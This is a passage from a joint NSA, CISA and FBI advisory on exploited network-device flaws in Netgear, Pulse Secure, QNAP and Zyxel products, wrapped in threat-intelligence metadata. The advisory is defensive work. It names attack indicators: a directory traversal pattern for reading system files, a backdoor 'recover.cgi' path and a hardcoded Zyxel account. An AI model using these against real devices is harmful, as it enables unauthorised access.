6.43rc3\nReferences\nhttps://blog.mikrotik.com/security/winbox-vulnerability.html\nTable 10: Information on Netgear CVE-2017-6862\n\nNetgear CVE-2017-6862\n\nCVSS 3.0: 9.8 (Critical)\n\nVulnerability Description\nNETGEAR WNR2000v3 devices before 1.1.2.14, WNR2000v4 devices before 1.0.0.66, and\nWNR2000v5 devices before 1.0.0.42 allow authentication bypass and remote code execution via a\nbuffer overflow that uses a parameter in the administration webapp. The NETGEAR ID is PSV-20160261.\nRecommended Mitigations\n• NETGEAR has released firmware updates that fix the unauthenticated remote code execution\nvulnerability for all affected products.\nDetection Methods\n• HTTP packet inspection to find any specially crafted packets attempting a buffer overflow through\nspecialized parameters.\nVulnerable Technologies and Versions\nThis vulnerability affects the following products:\n WNR2000v3 before version 1.1.2.14\n WNR2000v4 before version 1.0.0.66\n WNR2000v5 before version 1.0.0.42\n R2000\nReferences\nhttps://kb.netgear.com/000038542/Security-Advisory-for-Unauthenticated-Remote-Code-Execution-onSome-Routers-PSV-2016-0261\nhttps://www.on-x.com/sites/default/files/on-x_-_security_advisory_-_netgear_wnr2000v5_-_cve-20176862.pdf\nhttp://www.securityfocus.com/bid/98740\nTable 11: Information on Pulse CVE-2019-11510\n\nPulse CVE-2019-11510\n\nCVSS 3.0: 10 (Critical)\n\nVulnerability Description\nIn Pulse Secure Pulse Connect Secure (PCS) 8.2 before 8.2R12.1, 8.3 before 8.3R7.1, and 9.0 before\n9.0R3.4, an unauthenticated remote attacker can send a specially crafted URI to perform an arbitrary\nfile reading vulnerability.\nRecommended Mitigations\n• Upgrade to the latest Pulse Secure VPN.\n• Stay alert to any scheduled tasks or unknown files/executables.\n• Create detection/protection mechanisms that respond on directory traversal (/../../../) attempts to\nread local system files.\n\nU/OO/160405-22 | PP-22- 0825 | JUN 2022 Ver 1.0\n\n15\n\nTLP:WHITE\n\nNSA, CISA, & FBI | PRC State-Sponsored Actors Exploit Network Providers, Devices\n\nDetection Methods\n• CISA developed a tool to help determine if IOCs exist in the log files of a Pulse Secure VPN\nAppliance for CVE-2019-11510: cisa.gov/check-your-pulse.\n• Nmap developed a script that can be used with the port scanning engine: http-vuln-cve201911510.nse #1708.\nVulnerable Technologies and Versions\nThis vulnerability affects the following Pulse Connect Secure products:\n 9.0R1 to 9.0R3.3\n 8.3R1 to 8.3R7\n 8.2R1 to 8.2R12\nReferences\nhttps://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101/\nTable 12: Information on Pulse CVE-2021-22893\n\nPulse CVE-2021-22893\n\nCVSS 3.0: 10 (Critical)\n\nVulnerability Description\nPulse Connect Secure 9.0R3/9.1R1 and higher is vulnerable to an authentication bypass vulnerability\nexposed by the Windows File Share Browser and Pulse Secure Collaboration features of Pulse\nConnect Secure that can allow an unauthenticated user to perform remote arbitrary code execution on\nthe Pulse Connect Secure gateway. This vulnerability has been exploited in the wild.\nRecommended Mitigations\n• Updating such systems to PCS 9.1R11.4.\n• Run the PCS Integrity Assurance utility.\n• Enable Unauthenticated Request logging.\n• Enable remote logging.\n• Pulse Secure has published a Workaround-2104.xml file that contains mitigations to protect against\nthis and other vulnerabilities.\n• Monitor capabilities in open source scanners.\nDetection Methods\n• Log correlation between the authentication servers responsible for LDAP and RADIUS\nauthentication and the VPN server. Authentication failures in either LDAP or RADIUS logs with the\nassociated VPN logins showing success would be an anomalous event worthy of flagging.\n• The Pulse Security Check Tool.\n• A ‘recovery’ file not present in legitimate versions. https://ive-host/danana/auth/recover[.]cgi?token=<varies>.\nVulnerable Technologies and Versions\nThis vulnerability affects Pulse Connect Secure 9.0R3/9.1R1 and higher.\nReferences\nhttps://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101/\nhttps://blog.pulsesecure.net/pulse-connect-secure-security-update/\nhttps://kb.cert.org/vuls/id/213092\nhttps://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44784/\nhttps://www.fireeye.com/blog/threat-research/2021/04/suspected-apt-actors-leverage-bypasstechniques-pulse-secure-zero-day.html\n\nU/OO/160405-22 | PP-22- 0825 | JUN 2022 Ver 1.0\n\n16\n\nTLP:WHITE\n\nNSA, CISA, & FBI | PRC State-Sponsored Actors Exploit Network Providers, Devices\n\nTable 13: Information on QNAP CVE-2019-7192\n\nQNAP CVE-2019-7192\n\nCVSS 3.0: 9.8 (Critical)\n\nVulnerability Description\nThis improper access control vulnerability allows remote attackers to gain unauthorized access to the\nsystem. To fix these vulnerabilities, QNAP recommend updating Photo Station to their latest versions.\nRecommended Mitigations\nUpdate Photo Station to versions:\n• QTS 4.4.1 Photo Station 6.0.3 and later\n• QTS 4.3.4-QTS 4.4.0 Photo Station 5.7.10 and later\n• QTS 4.3.0-QTS 4.3.3 Photo Station 5.4.9 and later\n• QTS 4.2.6 Photo Station 5.2.11 and later\nDetection Methods\n• N/A\nVulnerable Technologies and Versions\nThis vulnerability affects QNAP Photo Station versions 5.2.11, 5.4.9, 5.7.10, and 6.0.3 or earlier.\nReferences\nhttps://www.qnap.com/zh-tw/security-advisory/nas-201911-25\nhttp://packetstormsecurity.com/files/157857/QNAP-QTS-And-Photo-Station-6.0.3-Remote-CommandExecution.html\n\nTable 14: Information on QNAP CVE- 2019-7193\n\nQNAP CVE-2019-7193\n\nCVSS 3.0: 9.8 (Critical)\n\nVulnerability Description\nThis improper input validation vulnerability allows remote attackers to inject arbitrary code to the\nsystem. To fix the vulnerability, QNAP recommend updating QTS to their latest versions.\nRecommended Mitigations\nUpdate QTS to versions:\n• QTS 4.4.1 build 20190918 and later\n• QTS 4.3.6 build 20190919 and later\nDetection Methods\n• N/A\nVulnerable Technologies and Versions\nThis vulnerability affects QNAP QTS 4.3.6 and 4.4.1 or earlier.\nReferences\nhttps://www.qnap.com/zh-tw/security-advisory/nas-201911-25\nhttp://packetstormsecurity.com/files/157857/QNAP-QTS-And-Photo-Station-6.0.3-Remote-CommandExecution.html\n\nTable 15: Information on QNAP CVE-2019-7194\n\nU/OO/160405-22 | PP-22- 0825 | JUN 2022 Ver 1.0\n\n17\n\nTLP:WHITE\n\nNSA, CISA, & FBI | PRC State-Sponsored Actors Exploit Network Providers, Devices\n\nQNAP CVE-2019-7194\n\nCVSS 3.0: 9.8 (Critical)\n\nVulnerability Description\nThis external control of file name or path vulnerability allows remote attackers to access or modify\nsystem files. To fix the vulnerability, QNAP recommend updating Photo Station to their latest versions.\nRecommended Mitigations\nUpdate Photo Station to versions:\n• QTS 4.4.1 Photo Station 6.0.3 and later\n• QTS 4.3.4-QTS 4.4.0 Photo Station 5.7.10 and later\n• QTS 4.3.0-QTS 4.3.3 Photo Station 5.4.9 and later\n• QTS 4.2.6 Photo Station 5.2.11 and later\nDetection Methods\n• N/A\nVulnerable Technologies and Versions\nThis vulnerability affects QNAP Photo Station versions 5.2.11, 5.4.9, 5.7.10, and 6.0.3 or earlier.\nReferences\nhttps://www.qnap.com/zh-tw/security-advisory/nas-201911-25\nhttp://packetstormsecurity.com/files/157857/QNAP-QTS-And-Photo-Station-6.0.3-Remote-CommandExecution.html\n\nTable 16: Information on QNAP CVE-2019-7195\n\nQNAP CVE-2019-7195\n\nCVSS 3.0: 9.8 (Critical)\n\nVulnerability Description\nThis external control of file name or path vulnerability allows remote attackers to access or modify\nsystem files. To fix the vulnerability, QNAP recommend updating Photo Station to their latest versions.\nRecommended Mitigations\nUpdate Photo Station to versions:\n• QTS 4.4.1 Photo Station 6.0.3 and later\n• QTS 4.3.4-QTS 4.4.0 Photo Station 5.7.10 and later\n• QTS 4.3.0-QTS 4.3.3 Photo Station 5.4.9 and later\n• QTS 4.2.6 Photo Station 5.2.11 and later\nDetection Methods\n• N/A\nVulnerable Technologies and Versions\nThis vulnerability affects QNAP Photo Station versions 5.2.11, 5.4.9, 5.7.10, and 6.0.3 or earlier.\nReferences\nhttps://www.qnap.com/zh-tw/security-advisory/nas-201911-25\nhttp://packetstormsecurity.com/files/157857/QNAP-QTS-And-Photo-Station-6.0.3-Remote-CommandExecution.html\n\nTable 17: Information on Zyxel CVE-2020-29583\n\nZyxel CVE-2020-29583\n\nU/OO/160405-22 | PP-22- 0825 | JUN 2022 Ver 1.0\n\nCVSS 3.0: 9.8 (Critical)\n\n18\n\nTLP:WHITE\n\nNSA, CISA, & FBI | PRC State-Sponsored Actors Exploit Network Providers, Devices\n\nVulnerability Description\nFirmware version 4.60 of Zyxel USG devices contains an undocumented account (zyfwp) with an\nunchangeable password. The password for this account can be found in cleartext in the firmware. This\naccount can be used by someone to login to the SSH server or web interface with admin privileges.\nRecommended Mitigations\n• Download latest patch (4.60 Patch1 or newer)\nDetection Methods\n• Login attempts to the hardcoded undocumented account, seen in either audit logs or intrusion\ndetection systems\nVulnerable Technologies and Versions\nThis vulnerability affects the following technologies and versions:\n ATP series running firmware ZLD V4.60\n USG series running firmware ZLD V4.60\n USG FLEX series running firmware ZLD V4.60\n VPN series running firmware ZLD V4.60\n NXC2500 running firmware V6.00 through V6.10\n NXC5500 running firmware V6.00 through V6.10\nReferences\nhttp://ftp.zyxel.com/USG40/firmware/USG40_4.60(AALA.1)C0_2.pdf\nhttps://businessforum.zyxel.com/discussion/5252/zld-v4-60-revoke-and-wk48-firmware-release\nhttps://businessforum.zyxel.com/discussion/5254/whats-new-for-zld4-60-patch-1-available-on-dec-15\nhttps://www.eyecontrol.nl/blog/undocumented-user-account-in-zyxel-products.html\nhttps://www.zyxel.com/support/CVE-2020-29583.shtml\nhttps://www.zyxel.com/support/security_advisories.shtml\n\nU/OO/160405-22 | PP-22- 0825 | JUN 2022 Ver 1.0\n\n19",
    "language": "EN",
    "sources": [
        {
            "id": "4e039bf8-7239-4999-8ec0-eb202d1465af",
            "created_at": "2022-12-04T11:19:36.52593Z",
            "updated_at": "2022-12-04T11:19:36.52593Z",
            "deleted_at": null,
            "name": "ORKL",
            "url": "https://github.com/ORKL/library",
            "description": "ORKL Community Contributed Content",
            "reports": null
        }
    ],
    "references": [
        "https://www.cisa.gov/uscert/ncas/alerts/aa22-158a",
        "https://media.defense.gov/2022/Jun/07/2003013376/-1/-1/0/CSA_PRC_SPONSORED_CYBER_ACTORS_EXPLOIT_NETWORK_PROVIDERS_DEVICES_TLPWHITE.PDF"
    ],
    "report_names": [
        "CSA_PRC_SPONSORED_CYBER_ACTORS_EXPLOIT_NETWORK_PROVIDERS_DEVICES_TLPWHITE.PDF"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f9806b99-e392-46f1-9c13-885e376b239f",
            "created_at": "2023-01-06T13:46:39.431871Z",
            "updated_at": "2025-03-27T02:00:03.08926Z",
            "deleted_at": null,
            "main_name": "Watchdog",
            "aliases": [
                "Thief Libra"
            ],
            "source_name": "MISPGALAXY:Watchdog",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1672160769,
    "ts_updated_at": 1743041819,
    "ts_creation_date": 1654596659,
    "ts_modification_date": 1654596659,
    "files": {
        "pdf": "https://archive.orkl.eu/6b79f4b71b9ded49453c3d9a0a7d8b37f30136e1.pdf",
        "text": "https://archive.orkl.eu/6b79f4b71b9ded49453c3d9a0a7d8b37f30136e1.txt",
        "img": "https://archive.orkl.eu/6b79f4b71b9ded49453c3d9a0a7d8b37f30136e1.jpg"
    }
}